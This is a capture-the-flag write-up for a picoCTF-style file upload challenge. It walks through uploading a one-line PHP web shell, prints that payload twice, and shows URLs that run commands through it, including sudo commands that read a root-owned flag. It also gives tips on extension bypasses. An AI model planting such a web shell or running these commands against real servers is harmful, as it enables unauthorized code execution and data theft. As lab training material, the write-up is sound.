# n0s4n1ty 1 CTF: File Upload Vulnerability Writeup

## üìå Challenge Description

> The challenge presents a **file upload vulnerability** on a web application. Our goal is to exploit this vulnerability to gain access to sensitive data or execute arbitrary code on the server to retrieve the flag.

## üß† Understanding the Challenge

This challenge revolves around an insecure file upload feature that allows an attacker to upload any type of file. The goal is to upload a PHP file and use it to execute commands on the server.

## üõ†Ô∏è Step-by-Step Solution

### 1. Open the Website

The website provides a file upload form that accepts all file types ‚Äî including `.php`.

### 2. Create a Malicious PHP File

We create a simple PHP web shell that takes a command from a GET parameter and executes it.

```php
<?php
    echo shell_exec($_GET['cmd']);
?>
```

Upload this file using the site‚Äôs upload feature.

### 3. Locate the Uploaded File

After uploading, we try accessing the uploaded file in a predictable upload folder like:

```
http://standard-pizzas.picoctf.net:54419/upload.php
```

We can now append commands to the URL using the `cmd` parameter, for example:

```
http://standard-pizzas.picoctf.net:54419/uploads/malicious.php?cmd=whoami
```

When we enter: 

```
http://standard-pizzas.picoctf.net:54419/uploads/malicious.php?cmd=sudo -l
```

This will tell us that we can run any command with any account....


Let's try as root:

To get root we need to redirect to thhis url

```
http://standard-pizzas.picoctf.net:54419/uploads/malicious.php?cmd=sudo ls /root
```

This will list all files in root..


**Here we found flag.txt in root folder...**
 

### 4. Find the Flag

Once we confirm that our PHP shell is working, we can try reading the flag file.

Try the following in your browser:

```
http://standard-pizzas.picoctf.net:54419/uploads/malicious.php?cmd=sudo cat /root/flag.txt
```

If the file exists and permissions are open, this will output the flag.

### 5. Flag Retrieved

Success! We see the flag printed on the page.

```

## üìö Concepts Learned

- Exploiting file upload vulnerabilities
- Bypassing file type restrictions
- Command execution through PHP
- Locating and reading sensitive files on a web server

## ‚úÖ Tips

- Always check file type validation on upload forms
- Try uploading `.php`, `.php5`, or `.phtml` extensions
- Use predictable paths to locate uploaded files
- Append `?cmd=COMMAND` if your payload uses GET-based command injection

{% raw %}
**Payload:** `<?php echo shell_exec($_GET['cmd']); ?>`
{% endraw %}
